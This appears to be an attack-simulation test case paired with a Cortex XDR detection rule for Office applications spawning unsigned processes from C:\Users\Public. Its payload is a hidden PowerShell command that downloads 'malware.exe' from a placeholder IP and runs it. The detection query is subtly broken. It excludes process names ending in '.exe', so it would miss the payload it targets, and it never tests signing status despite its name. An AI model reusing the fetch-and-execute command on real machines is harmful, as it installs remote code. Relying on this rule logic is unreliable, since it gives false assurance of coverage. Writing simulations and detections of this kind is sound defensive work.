identity.description: An attacker uses a signed Office application to spawn an unsigned malicious process from a suspicious directory, bypassing typical security controls. Cortex should detect this rare behavior as a potential indicator of compromise.

payload.code:
cd C:\Users\Public
mkdir temp_dir
powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://192.0.2.10/malware.exe' -OutFile 'C:\Users\Public\temp_dir\malware.exe'"
start-process -FilePath "C:\Users\Public\temp_dir\malware.exe" -WindowStyle Hidden

expected_artifacts.description: Malicious file downloaded to suspicious directory

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Rare Unsigned Process Spawned by Office Process Under Suspicious Directory
biocs.description: Detection of unsigned processes launched by Office applications from non-standard directories.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'winword.exe'
| filter action_process_image_name != null
| filter action_process_image_name !~ '.*\.exe'
| filter action_file_path contains 'C:\\Users\\Public\\'
| filter action_file_path !~ '.*\\AppData\\.*'
